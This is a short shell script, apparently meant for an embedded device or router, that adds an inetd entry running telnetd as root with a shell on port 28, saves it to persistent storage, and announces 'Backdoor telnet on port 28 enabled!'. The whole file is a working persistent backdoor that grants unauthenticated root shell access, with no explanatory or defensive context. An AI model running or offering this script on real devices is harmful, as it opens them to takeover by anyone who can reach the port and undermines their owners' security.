echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28
pfs -a /var/etc/inetd.d/telnet28
pfs -s
echo "Backdoor telnet on port 28 enabled! Please reboot device"

